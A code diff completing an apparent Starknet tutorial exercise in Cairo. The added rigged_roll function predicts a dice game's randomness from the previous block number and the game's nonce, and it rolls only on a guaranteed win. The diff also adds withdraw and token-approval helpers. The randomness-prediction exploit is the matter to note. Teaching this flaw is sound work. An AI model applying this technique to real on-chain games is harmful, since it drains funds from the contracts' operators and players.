@@ -8,6 +8,7 @@ pub trait IRiggedRoll<T> {
     fn last_dice_value(self: @T) -> u256;
     fn predicted_roll(self: @T) -> u256;
     fn dice_game_dispatcher(self: @T) -> IDiceGameDispatcher;
+    fn approve_dice_game(ref self: T, amount: u256);
 }
 
 #[starknet::contract]
@@ -52,11 +53,33 @@ mod RiggedRoll {
     impl RiggedRollImpl of super::IRiggedRoll<ContractState> {
         // ToDo Checkpoint 2: Implement the `rigged_roll()` function to predict the randomness in
         // the DiceGame contract and only initiate a roll when it guarantees a win.
-        fn rigged_roll(ref self: ContractState, amount: u256) {}
+        fn rigged_roll(ref self: ContractState, amount: u256) {
+            let dice_game = self.dice_game.read();
+
+            assert(dice_game.eth_token_dispatcher().balanceOf(get_contract_address()) >= 2000000000000000, 'Not enough ETH');
+
+            let prev_block: u256 = get_block_number().into() - 1;
+            let nonce = dice_game.nonce();
+            let array = array![prev_block, nonce];
+            let roll = keccak_u256s_le_inputs(array.span()) % 16;
+            
+            self.predicted_roll.write(roll);
+
+            if (roll > 5) {
+                return;
+            }
+
+            dice_game.roll_dice(amount);
+        }
 
         // ToDo Checkpoint 3: Implement the `withdraw` function to transfer Ether from the rigged
         // contract to a specified address.
-        fn withdraw(ref self: ContractState, to: ContractAddress, amount: u256) {}
+        fn withdraw(ref self: ContractState, to: ContractAddress, amount: u256) {
+            assert(self.ownable.owner() == get_caller_address(), 'Not owner');
+            let dice_game = self.dice_game.read();
+            let eth_token = dice_game.eth_token_dispatcher();
+            eth_token.transfer(to, amount);
+        }
 
         fn last_dice_value(self: @ContractState) -> u256 {
             self.dice_game.read().last_dice_value()
@@ -66,6 +89,12 @@ mod RiggedRoll {
         }
         fn dice_game_dispatcher(self: @ContractState) -> IDiceGameDispatcher {
             self.dice_game.read()
+        }
+
+        fn approve_dice_game(ref self: ContractState, amount: u256) {
+            let dice_game = self.dice_game.read();
+            let eth_token = dice_game.eth_token_dispatcher();
+            eth_token.approve(dice_game.contract_address, amount);
         }
     }
 }
